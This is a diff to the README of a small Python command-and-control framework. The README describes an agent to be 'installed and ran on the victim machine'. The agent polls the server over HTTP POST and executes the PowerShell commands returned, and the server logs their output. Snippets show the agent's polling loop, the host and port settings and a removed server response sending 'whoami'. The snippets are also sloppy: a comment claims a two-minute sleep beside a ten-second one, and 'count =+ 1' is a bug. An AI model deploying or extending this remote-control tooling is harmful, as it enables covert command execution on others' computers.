@@ -1,6 +1,6 @@
 # pyc2-c2overPOSTresponse
 
-This project is still under development. This is a simple C2 server that allows you to run Powershell commands. 
+This project is still under development. This is a simple C2 framework that allows you to run Powershell commands. 
 
 It works as follows: 
 - Run server.py to start a http server
@@ -15,37 +15,49 @@ Download the .py files and run them.
 
 ## Usage
 
-For now you can only ran a command at a time. Open server.py and enter the command you want to be in the http response as shown below
-
-``` 
-        response_string = "whoami"
-
-        # Set the response headers
-        self.send_response(200)
-        self.send_header("Content-type", "text/plain")
-        self.send_header("Content-Length", len(response_string))
-        self.end_headers()
-
-        #send response string 
-        self.wfile.write(response_string.encode('utf-8'))
-```
+### Configure Agent.py
 
 Agent.py needs to be installed and ran on the victim machine. Provide the C2 url as shown below.
 
 ```
-    url = "http://localhost:8080"  # Replace your C2 URL 
-    # This string will be sent to C2 to verify it's alive and return output of a command ran
-    message_body = "ALIVE, Command Response: {}".format(output)
+    url = "http://localhost:8080"  # Replace your C2 URL
+
 ```
 
 The http requests are sent in time intervals. You can set this in Agent.py as well. 
 
 ```
-if command_to_run:
-            output = run_powershell_command(command_to_run)     
+output = 'No command Ran'
+    while True:
+        command_to_run = http_sender(output)
+        if command_to_run:
+            output = run_powershell_command(command_to_run) 
+        # Sleep for 2 minutes (120 seconds) before sending the next request   
         time.sleep(10)  
         count =+ 1
 ```
+
+Each HTTP POST request will require you to enter a desired command from the server side that will be sent in the HTTP response message body
+
+### Configure Server.py
+
+Configure the host and port you wish to run the C2 server on 
+
+```
+host = "localhost"
+port = 8080
+```
+Specify where you want to save the command output logs
+
+```
+        # Append the message body to a text file
+        with open('received_messages.txt', 'a') as file:
+            file.write(message_body + '\n')
+```
+
+## Summarized UML Sequence Diagram 
+
+<img width="465" alt="image" src="https://github.com/dewardvide/pyc2-c2overPOSTresponse/assets/91884298/49684dcd-459e-43d5-b8c4-fb3efcad69f6">
 
 ## Contributing
 
